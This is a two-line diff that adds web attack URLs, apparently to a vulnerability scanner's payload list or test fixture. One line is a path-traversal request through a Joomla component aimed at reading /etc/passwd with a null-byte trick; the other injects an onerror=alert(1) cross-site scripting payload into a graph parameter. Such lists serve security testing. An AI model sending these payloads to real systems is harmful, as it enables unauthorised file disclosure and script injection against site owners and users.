@@ -1,0 +1,2 @@
+/index.php?option=com_dwgraphs&controller=../../../../../../../../etc/passwd%00
+/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22
